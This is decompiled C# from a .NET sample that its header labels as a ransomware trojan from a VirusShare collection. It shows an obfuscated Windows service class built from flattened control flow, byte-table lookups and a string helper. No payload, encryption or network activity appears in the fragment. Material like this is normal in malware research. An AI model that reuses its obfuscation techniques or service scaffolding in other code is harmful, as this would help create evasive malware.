// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႥႷ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System;
using System.ComponentModel;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ServiceProcess;

namespace Ⴃ
{
  internal sealed class ႥႷ : ServiceBase
  {
    private IContainer Ⴐ;

    public ႥႷ() => this.Ⴐ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    [SpecialName]
    internal static ႳႰ.ႣႣ Ⴅ() => ႣႷ.Ⴅ;

    protected override void Dispose([In] bool obj0)
    {
      byte[] ⴍ = ႣႣ.Ⴍ;
      int num = 2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 4:
          case 6:
            goto label_5;
          case 1:
            goto label_4;
          case 5:
            num = this.Ⴐ == null ? (int) ⴍ[32] - 99 : 1;
            continue;
          default:
            num = !obj0 ? 0 : 5;
            continue;
        }
      }
label_4:
      this.Ⴐ.Dispose();
label_5:
      base.Dispose(obj0);
      ႷႼ.Ⴗ[134] = (char) ((int) ႷႼ.Ⴗ[134] - (int) ႷႼ.Ⴗ[79] & 21);
    }

    private void Ⴐ()
    {
      this.Ⴐ = (IContainer) new Container();
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႳႥ.Ⴍ(2076023034, (ႳႥ) null, 8, (Assembly) null), (short) 472, 'ư');
    }

    static ႥႷ() => ႳႣ.Ⴅ();

    internal static string Ⴀ<\u0021\u00210, \u0021\u00211>(
      [In] \u0021\u00210 obj0,
      [In] \u0021\u00211 obj1,
      [In] int obj2,
      [In] int obj3)
      where \u0021\u00210 : string
      where \u0021\u00211 : string
    {
      byte[] ⴐ = ႷႨ.Ⴐ;
      byte[] ⴍ = ႣႣ.Ⴍ;
label_3:
      int num1 = 0;
      int num2 = 5;
      IConvertible convertible;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 9:
            goto label_12;
          case 2:
            num2 = (int) ⴍ[78] - 152;
            continue;
          case 3:
            convertible = (IConvertible) null;
            num2 = 8;
            continue;
          case 4:
          case 6:
            goto label_3;
          case 5:
            int num3;
            switch ((obj3 ^ obj2) - 26 ^ num1)
            {
              case 0:
                num3 = (int) ⴍ[121];
                break;
              default:
                num3 = 3;
                break;
            }
            num2 = num3;
            continue;
          case 7:
            num2 = 5;
            continue;
          case 8:
          case 10:
            ++num1;
            int num4 = 152;
            int num5 = num4;
            num2 = (num5 * num5 + num4) % 2 == 0 ? 1 : 7;
            continue;
          case 11:
            convertible = (IConvertible) ((string) obj0 + (string) obj1);
            num2 = 8;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႥႷ.Ⴀ);
            num2 = (int) ⴐ[354] - 155;
            continue;
        }
      }
label_12:
      return (string) convertible;
    }
  }
}
